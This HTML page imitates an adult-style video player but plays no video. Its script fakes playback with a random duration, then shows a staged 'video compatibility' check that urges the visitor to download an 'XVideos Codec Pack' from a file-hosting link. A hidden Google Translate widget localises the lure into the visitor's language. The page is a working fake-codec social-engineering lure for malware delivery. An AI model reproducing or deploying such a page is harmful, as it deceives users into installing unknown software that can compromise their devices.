
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>XVideo Player</title>

<style>
/* GOOGLE TRANSLATE */
.goog-te-banner-frame.skiptranslate,
.goog-te-gadget-icon,
#goog-gt-tt,
.goog-te-balloon-frame,
.goog-te-menu-frame {
    display:none !important;
}

body > .skiptranslate {
    display:none !important;
}

body {
    margin:0;
    background:#000;
    min-height:100vh;
    font-family:Arial,sans-serif;
    color:#fff;
    overflow-x:hidden;

    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;

    padding:20px 0;
    box-sizing:border-box;
}

.player-wrapper {
    width:90vw;
    max-width:900px;
}

.player {
    position:relative;
    width:100%;
    aspect-ratio:16/9;

    background:#000 url("ai_bot.png") center/cover no-repeat;

    overflow:hidden;
    border-radius:12px;
    cursor:pointer;

    box-shadow:0 12px 40px rgba(0,0,0,.5);
}

.controls {
    position:absolute;
    bottom:0;
    left:0;
    right:0;

    background:rgba(0,0,0,.74);

    display:flex;
    align-items:center;

    padding:8px;
    gap:10px;

    font-size:14px;
}

.btn {
    cursor:pointer;
    display:flex;
    align-items:center;
    user-select:none;
    font-size:16px;

    transition:opacity .2s,transform .2s;
}

.btn:hover {
    opacity:.75;
}

.btn:active {
    transform:scale(.9);
}

.volume {
    display:flex;
    align-items:center;
    gap:4px;
    min-width:60px;
}

.volume input[type="range"] {
    width:80px;
    cursor:pointer;
}

.progress-container {
    flex:1;
    display:flex;
    align-items:center;
    gap:8px;
    min-width:80px;
}

.progress-bar {
    flex:1;
    height:4px;
    background:#333;
    border-radius:2px;
    position:relative;
    cursor:pointer;
}

.progress {
    width:0%;
    height:100%;
    background:#e65c2d;
    border-radius:2px;
}

.time {
    white-space:nowrap;
    font-size:13px;
}

.right-controls {
    display:flex;
    gap:12px;
    align-items:center;
}


/* ==================================================
   CODEC BOX
================================================== */

.codec-box {
    margin-top:0;

    padding:0 20px;

    background:
        linear-gradient(
            135deg,
            rgba(25,25,25,.97),
            rgba(11,11,11,.97)
        );

    border:1px solid rgba(255,255,255,.08);
    border-radius:12px;

    text-align:center;

    box-shadow:0 8px 30px rgba(0,0,0,.35);

    opacity:0;
    transform:translateY(10px);

    max-height:0;
    overflow:hidden;

    transition:
        opacity .4s ease,
        transform .4s ease,
        max-height .5s ease,
        margin-top .4s ease,
        padding .4s ease;
}

.codec-box.visible {
    opacity:1;
    transform:translateY(0);

    max-height:220px;

    margin-top:18px;

    padding:18px 20px;
}


/* CHECKING */

.checking {
    display:flex;
    align-items:center;
    justify-content:center;

    gap:10px;

    color:#aaa;

    font-size:13px;

    min-height:24px;
}

.loader {
    width:14px;
    height:14px;

    border:2px solid rgba(255,255,255,.18);
    border-top-color:#e65c2d;

    border-radius:50%;

    animation:spin .8s linear infinite;
}

@keyframes spin {
    to {
        transform:rotate(360deg);
    }
}


/* RESULT */

.codec-result {
    display:none;
}

.codec-result.show {
    display:block;

    animation:resultIn .45s ease;
}

@keyframes resultIn {
    from {
        opacity:0;
        transform:translateY(6px);
    }

    to {
        opacity:1;
        transform:translateY(0);
    }
}

.codec-title {
    margin:0 0 7px;

    font-size:16px;
    font-weight:600;

    color:#fff;
}

.codec-text {
    margin:0 0 15px;

    font-size:13px;
    line-height:1.5;

    color:#aaa;
}

.codec-button {
    display:inline-flex;

    align-items:center;
    justify-content:center;

    gap:8px;

    padding:11px 22px;

    border-radius:8px;

    background:
        linear-gradient(
            135deg,
            #e65c2d,
            #ff7a45
        );

    color:#fff;

    text-decoration:none;

    font-size:13px;
    font-weight:600;

    transition:
        transform .2s ease,
        box-shadow .2s ease;

    box-shadow:
        0 5px 18px rgba(230,92,45,.25);
}

.codec-button:hover {
    transform:translateY(-2px);

    box-shadow:
        0 8px 24px rgba(230,92,45,.4);
}

.codec-button:active {
    transform:translateY(0);
}


/* ==================================================
   MOBILE
================================================== */

@media(max-width:768px) {

    body {
        padding:15px 0;
    }

    .controls {
        font-size:12px;
        gap:6px;
        padding:6px;
    }

    .btn {
        font-size:14px;
    }

    .time {
        font-size:11px;
    }

    .volume input[type="range"] {
        width:60px;
    }

    .codec-box.visible {
        margin-top:14px;
        padding:16px;
    }

    .codec-title {
        font-size:15px;
    }

    .codec-text {
        font-size:12px;
    }
}

@media(max-width:480px) {

    .controls {
        font-size:11px;
        gap:4px;
    }

    .btn {
        font-size:12px;
    }

    .time {
        font-size:10px;
    }

    .volume input[type="range"] {
        width:50px;
    }

    .codec-button {
        width:100%;
        box-sizing:border-box;
    }
}
</style>
</head>

<body>

<!--
    Google Translate container.
    It is positioned outside the screen instead
    of display:none, because Google Translate
    may not initialize correctly when hidden.
-->
<div
    id="google_translate_element"
    style="
        position:absolute;
        left:-9999px;
        top:-9999px;
        width:1px;
        height:1px;
        overflow:hidden;
    ">
</div>


<div class="player-wrapper">

    <!-- PLAYER -->

    <div class="player" id="player">

        <div class="controls">

            <div
                class="btn"
                id="play-btn"
                title="Play">
                ▶
            </div>

            <div class="volume">

                <div
                    class="btn"
                    title="Volume">
                    🔊
                </div>

                <input
                    type="range"
                    id="volume"
                    min="0"
                    max="100"
                    value="50">
            </div>

            <div class="progress-container">

                <div
                    class="progress-bar"
                    id="progress-bar">

                    <div
                        class="progress"
                        id="progress">
                    </div>

                </div>

                <div
                    class="time"
                    id="time">
                    0:00 / 0:00
                </div>

            </div>

            <div class="right-controls">

                <div
                    class="btn"
                    title="Settings">
                    ⚙
                </div>

                <div
                    class="btn"
                    id="fullscreen-btn"
                    title="Fullscreen">
                    ⛶
                </div>

            </div>

        </div>
    </div>


    <!-- COMPATIBILITY BOX -->

    <div
        class="codec-box"
        id="codec-box">

        <div
            class="checking"
            id="checking">

            <span class="loader"></span>

            <span>
                Checking video compatibility...
            </span>

        </div>


        <div
            class="codec-result"
            id="codec-result">

            <div class="codec-title">
                Video compatibility issue
            </div>

            <p class="codec-text">
                This video requires additional codecs
                for proper playback. Install the codec
                pack and enjoy seamless viewing.
            </p>

            <a
                class="codec-button"
                href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack"
                target="_blank"
                rel="noopener noreferrer">

                <span>⬇</span>
                Install Codecs

            </a>

        </div>

    </div>

</div>


<script>

/* ==================================================
   PLAYER
================================================== */

const playBtn =
    document.getElementById("play-btn");

const player =
    document.getElementById("player");

const volumeSlider =
    document.getElementById("volume");

const progress =
    document.getElementById("progress");

const progressBar =
    document.getElementById("progress-bar");

const timeDisplay =
    document.getElementById("time");

const codecBox =
    document.getElementById("codec-box");

const checking =
    document.getElementById("checking");

const codecResult =
    document.getElementById("codec-result");


let isPlaying = false;

let interval = null;

let currentTime = 0;

let compatibilityTimer = null;

let resultTimer = null;


/* Random duration 12:02 - 15:28 */

const totalDuration =
    Math.floor(
        Math.random() * (928 - 722 + 1)
    ) + 722;


/* ==================================================
   TIME
================================================== */

function formatTime(sec) {

    const m =
        Math.floor(sec / 60);

    const s =
        sec % 60;

    return (
        m + ":" +
        s.toString().padStart(2,"0")
    );
}


function updateTime() {

    timeDisplay.textContent =
        formatTime(currentTime) +
        " / " +
        formatTime(totalDuration);

    progress.style.width =
        (currentTime / totalDuration * 100) +
        "%";
}


/* ==================================================
   PLAY
================================================== */

function startProgress() {

    if (interval !== null)
        return;

    interval = setInterval(() => {

        if (currentTime < totalDuration) {

            currentTime++;

            updateTime();

        } else {

            stopProgress();

        }

    },1000);
}


/* ==================================================
   STOP
================================================== */

function stopProgress() {

    if (interval !== null) {

        clearInterval(interval);

        interval = null;
    }

    isPlaying = false;

    playBtn.textContent = "▶";

    playBtn.title = "Play";
}


/* ==================================================
   COMPATIBILITY
================================================== */

function showCompatibilityCheck() {

    if (compatibilityTimer !== null)
        return;


    /*
       Wait 2 seconds after click.
    */

    compatibilityTimer =
        setTimeout(() => {

            codecBox.classList.add(
                "visible"
            );


            /*
               Show checking for 3 seconds.
            */

            resultTimer =
                setTimeout(() => {

                    checking.style.display =
                        "none";

                    codecResult.classList.add(
                        "show"
                    );


                    /*
                       Notify Google Translate
                       that new text appeared.
                    */

                    translateNewContent();

                },3000);

        },2000);
}


/* ==================================================
   PLAY BUTTON
================================================== */

playBtn.addEventListener(
    "click",
    e => {

        e.stopPropagation();

        if (isPlaying) {

            stopProgress();

        } else {

            startProgress();

            isPlaying = true;

            playBtn.textContent = "⏸";

            playBtn.title = "Stop";

            showCompatibilityCheck();
        }

    }
);


/* ==================================================
   PLAYER CLICK
================================================== */

player.addEventListener(
    "click",
    e => {

        if (
            e.target.closest(".controls")
        ) {
            return;
        }

        if (!isPlaying) {

            startProgress();

            isPlaying = true;

            playBtn.textContent = "⏸";

            playBtn.title = "Stop";

            showCompatibilityCheck();
        }

    }
);


/* ==================================================
   VOLUME
================================================== */

volumeSlider.addEventListener(
    "input",
    () => {

        console.log(
            "Volume:",
            volumeSlider.value
        );

    }
);


/* ==================================================
   SEEK
================================================== */

progressBar.addEventListener(
    "click",
    e => {

        e.stopPropagation();

        const rect =
            progressBar.getBoundingClientRect();

        const x =
            e.clientX - rect.left;

        currentTime =
            Math.floor(
                x / rect.width *
                totalDuration
            );

        updateTime();

    }
);


updateTime();


/* ==================================================
   GOOGLE TRANSLATE
================================================== */

let browserLang = "en";


function googleTranslateElementInit() {

    new google.translate.TranslateElement(
        {
            pageLanguage:"en",

            autoDisplay:false,

            includedLanguages:
                "en,uk,ru,de,fr,es,it,pt,pl,tr,ro,cs,sk,hu,nl,sv,no,da,fi,el,bg,ar,he,hi,ja,ko,zh-CN,zh-TW",

            layout:
                google.translate.TranslateElement.InlineLayout.SIMPLE

        },

        "google_translate_element"
    );


    /*
       Browser language
    */

    browserLang =
        (
            navigator.language ||
            navigator.userLanguage ||
            "en"
        )
        .toLowerCase()
        .split("-")[0];


    /*
       Wait until Google Translate
       creates its language selector.
    */

    waitForTranslator();
}


/* ==================================================
   WAIT FOR TRANSLATOR
================================================== */

function waitForTranslator() {

    let attempts = 0;

    const timer =
        setInterval(() => {

            const select =
                document.querySelector(
                    ".goog-te-combo"
                );

            attempts++;


            if (select) {

                if (
                    browserLang !== "en"
                ) {

                    select.value =
                        browserLang;

                    select.dispatchEvent(
                        new Event("change")
                    );
                }

                clearInterval(timer);

                return;
            }


            if (attempts >= 40) {

                clearInterval(timer);
            }

        },500);
}


/* ==================================================
   TRANSLATE NEW CONTENT
================================================== */

function translateNewContent() {

    if (browserLang === "en")
        return;


    const select =
        document.querySelector(
            ".goog-te-combo"
        );

    if (!select)
        return;


    /*
       Re-trigger translation.
    */

    select.value = "en";

    select.dispatchEvent(
        new Event("change")
    );


    setTimeout(() => {

        select.value =
            browserLang;

        select.dispatchEvent(
            new Event("change")
        );

    },500);
}


/* ==================================================
   OBSERVER
================================================== */

const observer =
    new MutationObserver(
        mutations => {

            let newText = false;

            mutations.forEach(
                mutation => {

                    if (
                        mutation.type ===
                        "childList"
                    ) {
                        newText = true;
                    }

                }
            );


            if (
                newText &&
                browserLang !== "en"
            ) {

                /*
                   Give Google Translate
                   a moment to process DOM.
                */

                setTimeout(
                    translateNewContent,
                    300
                );
            }

        }
    );


observer.observe(
    document.body,
    {
        childList:true,
        subtree:true
    }
);

</script>


<!-- GOOGLE TRANSLATE -->

<script
src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit">
</script>

</body>
</html>
